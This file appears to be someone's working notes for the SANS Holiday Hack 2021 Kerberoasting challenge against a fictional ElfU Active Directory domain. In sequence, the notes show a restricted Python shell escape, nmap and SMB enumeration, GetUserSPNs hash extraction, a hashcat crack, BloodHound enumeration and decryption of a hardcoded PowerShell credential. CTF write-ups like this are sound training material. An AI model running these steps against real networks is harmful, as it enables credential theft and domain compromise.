@@ -1,0 +1,497 @@
+kerberoasting
+
+Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints.
+
+ElfU Registration Portal
+New Student Domain Account Creation Successful!
+You can now access the student network grading system by SSH'ing into this asset using the command below:
+ssh exnruoveaz@grades.elfu.org -p 2222
+ElfU Domain Username: nvfffnnpkr
+ElfU Domain Password: Uxoglgtft@
+
+the grades script evaluates the first letter typed
+tried typing all letters for hidden functions
+tried esaping with semi colon, quotes
+tried starting ssh with /bin/bash command
+
+
+
+escape, colon then ctrl+d kills the script and brings back to a prompt 
+Traceback (most recent call last):
+  File "/opt/grading_system", line 41, in <module>
+    main()
+  File "/opt/grading_system", line 26, in main
+    a = input(": ").lower().strip()
+EOFError: EOF when reading a line
+>>>
+
+import os
+eval(os.system('command'))
+
+>>> eval(os.system("ip addr sho"))
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+10: eth0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+
+not too helpful since we know the devices are on 10.x.x.x
+hint says to look at routing tables
+
+>>> eval(os.system("route"))
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+10.128.1.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+10.128.2.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+10.128.3.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
+0
+
+since we're trying to find windows stuff
+nmap -Pn --open -p 22,139,445,88,389,636,3389 10.128.1.0/24 10.128.2.0/24 10.128.3.0/24
+
+
+Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
+Host is up (0.00064s latency).
+Not shown: 1 filtered port
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+88/tcp   open  kerberos-sec
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+636/tcp  open  ldapssl
+3389/tcp open  ms-wbt-server
+
+10.128.2.0/24 looks like workstations -- lots of 22, 139, 445 hits, it's a mixture of results but virtually every address in the range
+same for 10.128.3.0/24
+
+so it's likely i'd say 10.128.1.0/24 is infra and 10.128.2.0/23 is userland
+
+test this: python -c 'import pty; pty.spawn("/bin/bash")'
+works great! powershell, not so much...
+
+can change shell:
+chsh
+-> provide Password
+/bin/bash
+
+now can ssh into normal bash, pwsh works
+
+cannot enter-pssession into the domain controller...
+no hosts in the user subnet have 3389, 5985, or 5986
+only dc has them open on 10.128.1.0/24
+
+
+getuserspns.py -> just start with this?
+hittem in hashcat
+
+what's my actual account? is it a domain member?
+
+did a ssh tunnel to 3389 on the dc
+cert is for dc01.elfu.local
+domain should be elfu.local
+tried to sign in with grades account and got not authorized; creds seem legit
+
+
+python3 getuserspns.py elfu.local/exnruoveaz:Rgkiesvol@ -outputfile out.txt -dc-ip 10.128.1.53
+
+got this hash
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$e5be0dcae300237a7b74584ae75bfba3$eaf152c5514df72e45d8427be5524365e1d776c24c94d21fcd99950f50222c655cd8dc0386204b0ea17d4041e080363fe862df998cfebc38c91fd1557b9304b5818351b1f38c2b23a902ea9738d083f8069df7e1b58b50f7a5286e32c00a246606f18f4b3c4643a811895cc1ce61e4356cec75444e1e522886f72a699ebc656690a5d09594192cfe9b62157087b6ab367b6002b8f1bee72b3c4f8765b67434175647b42119e4a7bd98c0c25190ffc54977a79b0c6ff8c8dbe8838134f47b7e31397db0125c2ae64a52c711673b613f843bb8cd355204044ab7a465115adc3f0daf11db98665518e59a4fda4ee6772e98593bb417f7381d546df89ca47d234d677c16309a8f0b4efed7a54af5fd96ddbb4e9b703199cc83db132de330a94f67118001e2d272f2184e1bf3112ba21065b460ac2100fefe7dbab257f31ff7476cae66b8058385e8787fef05c49b77004519de5c0931cdcb6876379f62a124603f09fb95feee6fa603e81aaa5c4dada404f7d4abe691481d73f52195e630fa3ccde699258b01a158db05012a7b874040369a4c11c3bcc5b7fbf29d448dfde31637588d32b8e4abaccc7977e4da9112ec6972a06b0d394ea042e66fca0c49e5e2c5266696062560924a3ad01ddef46077d48f55433ec026181c0955db1d5312d8c41f8b19b9edc9a8748a4f99adc7e2af6f27065a8737f824577129343f54e83912cd7bf2b781833770e4a8c7b6cd49da2887fe28571f7eab76b7c5f027cce1d77941ef437fff6cabfd775257be1b01756957b67e95773ed3e0eeeb35f2e09a2ad568e603264f13656ab6a0b09b86375e043bf1be3f270ba703f6b5ef10c2d25e379b874c9fd500fd101d306960f960509fa0edbfb1b0e5505a7ed0ab7907a9a4a538c5e307e3b69d0fb9aa949dc6311b21c5df62e55261f8e6080be80eb01077201411f4719b04cae4d6365549745bf3248ac07c39dbbf94f611ffbc143c220702c6f85223a3311ae516b9a3528bc2defc6937cd918ab1d1e921129165f35078747139e8823403ac1018df98724e3136a1af01813f0651a1f4369ab325991a5bbcca68f114095f6f0818a68f200469309000eaa485de6d060693bfcaa0150c9aa20d9a737a066e6ee2a276e18383c1ff09e7a85a7cad9cc089c976fee7d0c0c10caeadbac682933a209671715a73a9fb76f5d797904aad8daf968cf3010516fedfc21b685dc74ba6b1aa03c0799281f90aca38d6cd57530bebf379a3f473b9d00c89cfcf095c3db8331d922e99cdf05480989f53ea758f54406b50ff688000f247ba9b17b46fec2e48f201e9aded8b6812fcb7dece93113ed287c5f0f0386d5b341f3e45f62d80ab2109518e555465f9be8d50f6f511770df55dff4c1cd6ef0d2d7005cee420c3e886ef1a5890c593ede3034ce0bc6d33f272229d1f8304edaf74aa882c818e98
+
+make a wordlist with cewl from register.elfu.org
+(used curl -L to follow redirect, saved to a page, then used python's http.server to run cewl against)
+
+
+from windows box:
+.\hashcat.exe -a 0 .\kerberoast.txt .\wlist.txt -r ..\OneRuleToRuleThemAll.rule.txt -O
+
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$e5be0dcae300237a7b74584ae75bfba3$eaf152c5514df72e45d8427be5524365e1d776c24c94d                                                                                                           d21fcd99950f50222c655cd8dc0386204b0ea17d4041e080363fe862df998cfebc38c91fd1557b9304b5818351b1f38c2b23a902ea9738d083f8069df7e1b58b50f7a                                                                                                           a5286e32c00a246606f18f4b3c4643a811895cc1ce61e4356cec75444e1e522886f72a699ebc656690a5d09594192cfe9b62157087b6ab367b6002b8f1bee72b3c4f8                                                                                                           8765b67434175647b42119e4a7bd98c0c25190ffc54977a79b0c6ff8c8dbe8838134f47b7e31397db0125c2ae64a52c711673b613f843bb8cd355204044ab7a465115                                                                                                           5adc3f0daf11db98665518e59a4fda4ee6772e98593bb417f7381d546df89ca47d234d677c16309a8f0b4efed7a54af5fd96ddbb4e9b703199cc83db132de330a94f6                                                                                                           67118001e2d272f2184e1bf3112ba21065b460ac2100fefe7dbab257f31ff7476cae66b8058385e8787fef05c49b77004519de5c0931cdcb6876379f62a124603f09f                                                                                                           fb95feee6fa603e81aaa5c4dada404f7d4abe691481d73f52195e630fa3ccde699258b01a158db05012a7b874040369a4c11c3bcc5b7fbf29d448dfde31637588d32b                                                                                                           b8e4abaccc7977e4da9112ec6972a06b0d394ea042e66fca0c49e5e2c5266696062560924a3ad01ddef46077d48f55433ec026181c0955db1d5312d8c41f8b19b9edc                                                                                                           c9a8748a4f99adc7e2af6f27065a8737f824577129343f54e83912cd7bf2b781833770e4a8c7b6cd49da2887fe28571f7eab76b7c5f027cce1d77941ef437fff6cabf                                                                                                           fd775257be1b01756957b67e95773ed3e0eeeb35f2e09a2ad568e603264f13656ab6a0b09b86375e043bf1be3f270ba703f6b5ef10c2d25e379b874c9fd500fd101d3                                                                                                           306960f960509fa0edbfb1b0e5505a7ed0ab7907a9a4a538c5e307e3b69d0fb9aa949dc6311b21c5df62e55261f8e6080be80eb01077201411f4719b04cae4d636554                                                                                                           49745bf3248ac07c39dbbf94f611ffbc143c220702c6f85223a3311ae516b9a3528bc2defc6937cd918ab1d1e921129165f35078747139e8823403ac1018df98724e3                                                                                                           3136a1af01813f0651a1f4369ab325991a5bbcca68f114095f6f0818a68f200469309000eaa485de6d060693bfcaa0150c9aa20d9a737a066e6ee2a276e18383c1ff0                                                                                                           09e7a85a7cad9cc089c976fee7d0c0c10caeadbac682933a209671715a73a9fb76f5d797904aad8daf968cf3010516fedfc21b685dc74ba6b1aa03c0799281f90aca3                                                                                                           38d6cd57530bebf379a3f473b9d00c89cfcf095c3db8331d922e99cdf05480989f53ea758f54406b50ff688000f247ba9b17b46fec2e48f201e9aded8b6812fcb7dec                                                                                                           ce93113ed287c5f0f0386d5b341f3e45f62d80ab2109518e555465f9be8d50f6f511770df55dff4c1cd6ef0d2d7005cee420c3e886ef1a5890c593ede3034ce0bc6d3                                                                                                           33f272229d1f8304edaf74aa882c818e98:Snow2021!
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_sv...818e98
+Time.Started.....: Tue Dec 21 05:06:53 2021 (1 sec)
+Time.Estimated...: Tue Dec 21 05:06:54 2021 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (.\wlist.txt)
+Guess.Mod........: Rules (..\OneRuleToRuleThemAll.rule.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2155.6 kH/s (0.87ms) @ Accel:8 Loops:32 Thr:32 Vec:1
+Speed.#3.........:        0 H/s (0.00ms) @ Accel:4 Loops:64 Thr:8 Vec:4
+Speed.#*.........:  2155.6 kH/s
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 3134208/4003615 (78.28%)
+Rejected.........: 0/3134208 (0.00%)
+Restore.Point....: 0/77 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:40672-40704 Iteration:0-32
+Restore.Sub.#3...: Salt:0 Amplifier:0-0 Iteration:0-64
+Candidate.Engine.: Device Generator
+Candidates.#1....: _The_ -> cimes
+Candidates.#3....: [Copying]
+Hardware.Mon.#1..: Temp: 40c Util: 86% Core:1525MHz Mem:3003MHz Bus:16
+Hardware.Mon.#3..: N/A
+
+elfu_svc:Snow2021!
+looks like you need the student account still primarily for ssh, will need to test the pwd against domain and see its rights
+
+doesn't have direct access to domain controller via RDP either
+
+
+jtphrtgkqt@grades:~/BloodHound.py-master$ python3 bloodhound.py -u elfu_svc@elfu.local -p Snow2021! -d elfu.local -dc dc01.elfu.local --zip
+INFO: Found AD domain: elfu.local
+INFO: Connecting to LDAP server: dc01.elfu.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 238 computers
+INFO: Found 237 users
+INFO: Connecting to LDAP server: dc01.elfu.local
+INFO: Found 54 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.elfu.local
+INFO: Querying computer: share30.elfu.local
+INFO: Skipping enumeration for share30.elfu.local since it could not be resolved.
+INFO: Done in 00M 00S
+INFO: Compressing output into 20211221121954_bloodhound.zip
+
+domain admins:
+elfu_admin
+administrator
+
+share30.elfu.local is another DC01
+
+no apparent permissions weaknesses with given access
+
+python ldap3 library
+>>> from ldap3 import Server,Connection,ALL,NTLM
+>>> server = Server('dc01.elfu.local',get_info=ALL)
+>>> conn = Connection(server,user='elfu.local\elfu_svc',password="Snow2021!",authentication=NTLM)
+
+CN=ElfU Server,CN=Users,DC=elfu,DC=local
+CD=Domain Admins,CN=Users,DC=elfu,DC=local
+CN=jtphrtgkqt,CN=Users,DC=elfu,DC=local
+
+no progress here--
+lets smb-enum everything w/ nmap
+this is "faithful" to the talk
+
+nmap --script smb-enum-shares.nse -p 445 10.128.2.0/23
+
+Nmap scan report for 10.128.3.30
+Host is up (0.00071s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares:
+|   account_used: <blank>
+|   \\10.128.3.30\IPC$:
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (Samba 4.3.11-Ubuntu)
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.128.3.30\elfu_svc_shr:
+|     Type: STYPE_DISKTREE
+|     Comment: elfu_svc_shr
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\elfu_svc_shr
+|     Anonymous access: <none>
+|   \\10.128.3.30\netlogon:
+|     Type: STYPE_DISKTREE
+|     Comment:
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\sysvol\elfu.local\scripts
+|     Anonymous access: <none>
+|   \\10.128.3.30\research_dep:
+|     Type: STYPE_DISKTREE
+|     Comment: research_dep
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\research_dep
+|     Anonymous access: <none>
+|   \\10.128.3.30\sysvol:
+|     Type: STYPE_DISKTREE
+|     Comment:
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\sysvol
+|_    Anonymous access: <none>
+
+smbclient \\\\10.128.3.30\\elfu_svc_shr -W elfu.local -U elfu_svc
+smb: \> ls
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Tue Dec 21 08:01:27 2021
+  Get-NavArtifactUrl.ps1              N     2018  Wed Oct 27 19:12:43 2021
+  Get-WorkingDirectory.ps1            N      188  Wed Oct 27 19:12:43 2021
+  Stop-EtwTraceCapture.ps1            N      924  Wed Oct 27 19:12:43 2021
+  create-knownissue-function.ps1      N     2104  Wed Oct 27 19:12:43 2021
+  PsTestFunctions.ps1                 N    52454  Wed Oct 27 19:12:43 2021
+  StoreIngestionApplicationApi.ps1      N   108517  Wed Oct 27 19:12:43 2021
+  Compile-ObjectsInNavContainer.ps1      N     4431  Wed Oct 27 19:12:43 2021
+  Run-ConnectionTestToNavContainer.ps1      N    13856  Wed Oct 27 19:12:43 2021
+  StoreIngestionIapApi.ps1            N    80725  Wed Oct 27 19:12:43 2021
+  Test-SdnKnownIssue.ps1              N     4384  Wed Oct 27 19:12:43 2021
+  Setup-TraefikContainerForNavContainers.ps1      N     9184  Wed Oct 27 19:12:43 2021
+  Get-NavContainerPlatformVersion.ps1      N     1640  Wed Oct 27 19:12:43 2021
+  New-NavContainerWizard.ps1          N      926  Wed Oct 27 19:12:43 2021
+  ContainerHandling.ps1               N     1392  Wed Oct 27 19:12:43 2021
+  Get-NavContainerPath.ps1            N     2406  Wed Oct 27 19:12:43 2021
+  Extract-FilesFromStoppedNavContainer.ps1      N    12337  Wed Oct 27 19:12:43 2021
+  build.ps1                           N     1921  Wed Oct 27 19:12:43 2021
+  SdnRoles.ps1                        N      161  Wed Oct 27 19:12:43 2021
+  Confirm-UserInput.ps1               N      576  Wed Oct 27 19:12:43 2021
+  CheckHealth_https.ps1               N     1035  Wed Oct 27 19:12:43 2021
+  Test-SdnKINetworkInterfaceAPIDuplicateMacAddress.ps1      N     3545  Wed Oct 27 19:12:43 2021
+  UserHandling.ps1                    N      954  Wed Oct 27 19:12:43 2021
+  Copy-FileToNavContainer.ps1         N     2554  Wed Oct 27 19:12:43 2021
+  AzureVM.ps1                         N      204  Wed Oct 27 19:12:43 2021
+  Get-NavContainerAppInfo.ps1         N     4152  Wed Oct 27 19:12:43 2021
+  Sort-AppFoldersByDependencies.ps1      N     4949  Wed Oct 27 19:12:43 2021
+  Get-OvsdbAddressMapping.ps1         N     2790  Wed Oct 27 19:12:43 2021
+  Convert-Txt2Al.ps1                  N     5692  Wed Oct 27 19:12:43 2021
+  Replace-NavServerContainer.ps1      N     6060  Wed Oct 27 19:12:43 2021
+  Convert-WindowsImage.ps1            N    41636  Wed Oct 27 19:12:43 2021
+  Start-NavContainer.ps1              N     1021  Wed Oct 27 19:12:43 2021
+  Get-BcDatabaseExportHistory.ps1      N     2132  Wed Oct 27 19:12:43 2021
+  Export-ModifiedObjectsAsDeltas.ps1      N     5307  Wed Oct 27 19:12:43 2021
+  StoreIngestionFlightingApi.ps1      N   103200  Wed Oct 27 19:12:43 2021
+  Get-PublicIpReference.ps1           N     2945  Wed Oct 27 19:12:43 2021
+  HelperFunctions.ps1                 N    27213  Wed Oct 27 19:12:43 2021
+  Set-TraceOutputFile.ps1             N      278  Wed Oct 27 19:12:43 2021
+  Get-NetworkInterfaceEncapOverheadSetting.ps1      N     3033  Wed Oct 27 19:12:43 2021
+  Remove-DesktopShortcut.ps1          N     1407  Wed Oct 27 19:12:43 2021
+  Test-SdnEncapOverhead.ps1           N     3544  Wed Oct 27 19:12:43 2021
+  Resolve-DependenciesFromAzureFeed.ps1      N     7364  Wed Oct 27 19:12:43 2021
+  Format-NetshTraceProviderAsString.ps1      N     1611  Wed Oct 27 19:12:43 2021
+  Add-FontsToNavContainer.ps1         N     2709  Wed Oct 27 19:12:43 2021
+  Run-AlCops.ps1                      N    12613  Wed Oct 27 19:12:43 2021
+  Remove-CompanyInNavContainer.ps1      N     1613  Wed Oct 27 19:12:43 2021
+  LabConfig.ps1                       N    26968  Wed Oct 27 19:12:43 2021
+  Wait-NavContainerReady.ps1          N     2757  Wed Oct 27 19:12:43 2021
+  Bacpac.ps1                          N     3574  Wed Oct 27 19:12:43 2021
+  Encryption.ps1                      N     6790  Wed Oct 27 19:12:43 2021
+  Convert-ModifiedObjectsToAl.ps1      N     5477  Wed Oct 27 19:12:43 2021
+  Get-NavContainerImageTags.ps1       N     3501  Wed Oct 27 19:12:43 2021
+  Restore-DatabasesInNavContainer.ps1      N     7167  Wed Oct 27 19:12:43 2021
+  Get-NavContainerArtifactUrl.ps1      N     1464  Wed Oct 27 19:12:43 2021
+  NcManagedRoles.ps1                  N      145  Wed Oct 27 19:12:43 2021
+  Flush-ContainerHelperCache.ps1      N     7793  Wed Oct 27 19:12:43 2021
+  PackageHandling.ps1                 N      586  Wed Oct 27 19:12:43 2021
+  Get-SdnGatewayConfigurationState.ps1      N     5568  Wed Oct 27 19:12:43 2021
+  Install-NavContainerApp.ps1         N     2723  Wed Oct 27 19:12:43 2021
+  Get-FormattedDateTimeUTC.ps1        N      171  Wed Oct 27 19:12:43 2021
+  Get-OvsdbPhysicalPortTable.ps1      N     1510  Wed Oct 27 19:12:43 2021
+  Sync-NavContainerApp.ps1            N     2533  Wed Oct 27 19:12:43 2021
+  Invoke-NavContainerCodeunit.ps1      N     3449  Wed Oct 27 19:12:43 2021
+  OvsdbTable.ps1                      N      142  Wed Oct 27 19:12:43 2021
+  Run-TestsInNavContainer.ps1         N    26196  Wed Oct 27 19:12:43 2021
+  Get-SdnOvsdbUcastMacRemoteTable.ps1      N     2510  Wed Oct 27 19:12:43 2021
+  Test-SdnLoadBalancerMuxServiceState.ps1      N     3268  Wed Oct 27 19:12:43 2021
+  Publish-PerTenantExtensionApps.ps1      N     7981  Wed Oct 27 19:12:43 2021
+  Generate-SymbolsInNavContainer.ps1      N     3417  Wed Oct 27 19:12:43 2021
+  New-NavContainer.ps1                N   105949  Wed Oct 27 19:12:43 2021
+  Test-NavContainer.ps1               N     1722  Wed Oct 27 19:12:43 2021
+  SoftwareLoadBalancer.Tests.ps1      N     1154  Wed Oct 27 19:12:43 2021
+  Convert-EtwTraceToTxt.ps1           N     2912  Wed Oct 27 19:12:43 2021
+  Get-SdnDiagnosticLog.ps1            N     3055  Wed Oct 27 19:12:43 2021
+  Get-SdnNetworkController.ps1        N     1613  Wed Oct 27 19:12:43 2021
+  New-NavContainerWindowsUser.ps1      N     1893  Wed Oct 27 19:12:43 2021
+  Import-DeltasToNavContainer.ps1      N     4161  Wed Oct 27 19:12:43 2021
+  Set-BcContainerKeyVaultAadAppAndCertificate.ps1      N     5486  Wed Oct 27 19:12:43 2021
+  BcContainerHelper.ps1               N      323  Wed Oct 27 19:12:43 2021
+  Repair-NavContainerApp.ps1          N     1775  Wed Oct 27 19:12:43 2021
+  Create-AadAppsForNav.ps1            N    14383  Wed Oct 27 19:12:43 2021
+  create-health-function.ps1          N     2409  Wed Oct 27 19:12:43 2021
+  ConvertTo-HashTable.ps1             N      504  Wed Oct 27 19:12:43 2021
+  Utilities.Tests.ps1                 N      792  Wed Oct 27 19:12:43 2021
+  ConvertFrom-ExistingSubmission.ps1      N    52597  Wed Oct 27 19:12:43 2021
+  Get-SdnVfpVmSwitchPort.ps1          N     2445  Wed Oct 27 19:12:43 2021
+  Create-MyOriginalFolder.ps1         N     3515  Wed Oct 27 19:12:43 2021
+  Copy-FileFromNavContainer.ps1       N     2321  Wed Oct 27 19:12:43 2021
+  Test-SdnKIServerHostId.ps1          N     4615  Wed Oct 27 19:12:43 2021
+  CompanyHandling.ps1                 N      268  Wed Oct 27 19:12:43 2021
+  TenantHandling.ps1                  N     1095  Wed Oct 27 19:12:43 2021
+  Export-NavContainerObjects.ps1      N     7955  Wed Oct 27 19:12:43 2021
+  Get-GeneralConfigurationState.ps1      N     3654  Wed Oct 27 19:12:43 2021
+  Get-SdnOvsdbGlobalTable.ps1         N     2437  Wed Oct 27 19:12:43 2021
+  AppHandling.ps1                     N    15788  Wed Oct 27 19:12:43 2021
+  Test-SdnServerConfigState.ps1       N     3323  Wed Oct 27 19:12:43 2021
+  Get-NavContainerNavUser.ps1         N     1335  Wed Oct 27 19:12:43 2021
+  Get-VfpPortRule.ps1                 N     5340  Wed Oct 27 19:12:43 2021
+  VMState.ps1                         N      480  Wed Oct 27 19:12:43 2021
+  TraceLevel.ps1                      N      155  Wed Oct 27 19:12:43 2021
+  Install-AzDevops.ps1                N     1173  Wed Oct 27 19:12:43 2021
+  Test-SdnProviderAddressConnectivity.ps1      N     2795  Wed Oct 27 19:12:43 2021
+  Invoke-SdnNetworkControllerStateDump.ps1      N     3096  Wed Oct 27 19:12:43 2021
+  Clear-SdnWorkingDirectory.ps1       N     1895  Wed Oct 27 19:12:43 2021
+  Get-SdnProviderAddress.ps1          N     2451  Wed Oct 27 19:12:43 2021
+  Remove-PSRemotingSession.ps1        N     1764  Wed Oct 27 19:12:43 2021
+  Export-RegistryKeyConfigDetails.ps1      N     2468  Wed Oct 27 19:12:43 2021
+  Get-NavContainerImageLabels.ps1      N     3272  Wed Oct 27 19:12:43 2021
+  Get-AADToolkitApplicationCredentials.ps1      N     1941  Wed Oct 27 19:12:43 2021
+  basic_template.ps1                  N      554  Wed Oct 27 19:12:43 2021
+  Get-CompanyInNavContainer.ps1       N     1237  Wed Oct 27 19:12:43 2021
+  CreateVMFleetDisk.ps1               N     5140  Wed Oct 27 19:12:43 2021
+  NugetTools.ps1                      N    14494  Wed Oct 27 19:12:43 2021
+  Renew-LetsEncryptCertificate.ps1      N     3966  Wed Oct 27 19:12:43 2021
+  Trace-Output.ps1                    N     1895  Wed Oct 27 19:12:43 2021
+  Test-NetworkInterfaceLocation.ps1      N     2103  Wed Oct 27 19:12:43 2021
+  PatchParentDisks.ps1                N     3357  Wed Oct 27 19:12:43 2021
+  Get-LatestAlLanguageExtensionUrl.ps1      N     1882  Wed Oct 27 19:12:43 2021
+  Get-NavContainerGenericTag.ps1      N     1369  Wed Oct 27 19:12:43 2021
+  Copy-FileToRemoteComputerWinRM.ps1      N     2571  Wed Oct 27 19:12:43 2021
+  Start-EtwTraceSession.ps1           N     2605  Wed Oct 27 19:12:43 2021
+  Scenario.ps1                        N    19420  Wed Oct 27 19:12:43 2021
+  DownloadLatestCUs.ps1               N     5194  Wed Oct 27 19:12:43 2021
+  Test-SdnKIVMNetAdapterDuplicateMacAddress.ps1      N     3826  Wed Oct 27 19:12:43 2021
+  New-WorkingDirectory.ps1            N      623  Wed Oct 27 19:12:43 2021
+  Get-BestGenericImageName.ps1        N     9616  Wed Oct 27 19:12:43 2021
+  Download-Artifacts.ps1              N    11042  Wed Oct 27 19:12:43 2021
+  Confirm-RequiredModulesLoaded.ps1      N      669  Wed Oct 27 19:12:43 2021
+  Get-SdnServiceFabricReplica.ps1      N     4366  Wed Oct 27 19:12:43 2021
+  GetProcessInfo.ps1                  N      699  Wed Oct 27 19:12:43 2021
+  New-BcDatabaseExport.ps1            N     4133  Wed Oct 27 19:12:43 2021
+  Get-NavContainerEventLog.ps1        N     1989  Wed Oct 27 19:12:43 2021
+  Get-SdnEventLog.ps1                 N     3610  Wed Oct 27 19:12:43 2021
+  Disconnect-AADToolkit.ps1           N      372  Wed Oct 27 19:12:43 2021
+  Get-TraceProviders.ps1              N     2290  Wed Oct 27 19:12:43 2021
+  TelemetryHelper.ps1                 N    14866  Wed Oct 27 19:12:43 2021
+  Copy-FileFromRemoteComputer.ps1      N     3826  Wed Oct 27 19:12:43 2021
+  Open-NavContainer.ps1               N     1750  Wed Oct 27 19:12:43 2021
+  Start-SdnDataCollection.Tests.ps1      N      439  Wed Oct 27 19:12:43 2021
+  Start-NavContainerAppDataUpgrade.ps1      N     1933  Wed Oct 27 19:12:43 2021
+  Import-PfxCertificateToNavContainer.ps1      N     3433  Wed Oct 27 19:12:43 2021
+  Stop-NavContainer.ps1               N      623  Wed Oct 27 19:12:43 2021
+  settings.ps1                        N      682  Wed Oct 27 19:12:43 2021
+  Start-SdnDataCollection.ps1         N    13843  Wed Oct 27 19:12:43 2021
+  Invoke-ScriptInNavContainer.ps1      N     5924  Wed Oct 27 19:12:43 2021
+  Test-SdnGatewayConfigState.ps1      N     3628  Wed Oct 27 19:12:43 2021
+  Clean-BcContainerDatabase.ps1       N    15832  Wed Oct 27 19:12:43 2021
+  Publish-NavContainerApp.ps1         N    20064  Wed Oct 27 19:12:43 2021
+  Test-SdnKIServiceFabricPartitionDatabaseSize.ps1      N     5447  Wed Oct 27 19:12:43 2021
+  Ensure-LocalAdmin.ps1               N     5044  Wed Oct 27 19:12:43 2021
+  Get-SdnRoleConfiguration.ps1        N      318  Wed Oct 27 19:12:43 2021
+  Get-BcEnvironments.ps1              N     1691  Wed Oct 27 19:12:43 2021
+  Run-AlValidation.ps1                N    35917  Wed Oct 27 19:12:43 2021
+  UnPublish-NavContainerApp.ps1       N     4137  Wed Oct 27 19:12:43 2021
+  Move-SdnServiceFabricReplica.ps1      N     4490  Wed Oct 27 19:12:43 2021
+  updatehosts.ps1                     N     5165  Wed Oct 27 19:12:43 2021
+  Remove-NavContainerTenant.ps1       N     3770  Wed Oct 27 19:12:43 2021
+  New-CompanyInNavContainer.ps1       N     1762  Wed Oct 27 19:12:43 2021
+  AzureAD.ps1                         N      141  Wed Oct 27 19:12:43 2021
+  Copy-FileToRemoteComputer.ps1       N     3794  Wed Oct 27 19:12:43 2021
+  New-NavContainerTenant.ps1          N     5623  Wed Oct 27 19:12:43 2021
+
+  grepped for password, too loud
+  grepped for elfu, saw reference to remote_elf
+  checked bloodhound, member of 
+  remotemanagementdomainusers
+  remote_management_users
+
+  remote_elf has writedacl on researchdepartment group
+  likely the group that has access to \\10.128.3.30\research_dep
+  
+  GetProcessInfo.ps1 has the data we need
+
+  $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
+
+PS C:\Users\blake> $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+PS C:\Users\blake> $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+PS C:\Users\blake> $aPass | ConvertFrom-SecureString -AsPlainText
+A1d655f7f5d98b10!
+PS C:\Users\blake>
+
+remote_elf:A1d655f7f5d98b10!
+
+
+CN=jtphrtgkqt,CN=Users,DC=elfu,DC=local
+CN=Research Department,CN=Users,DC=elfu,DC=local
+
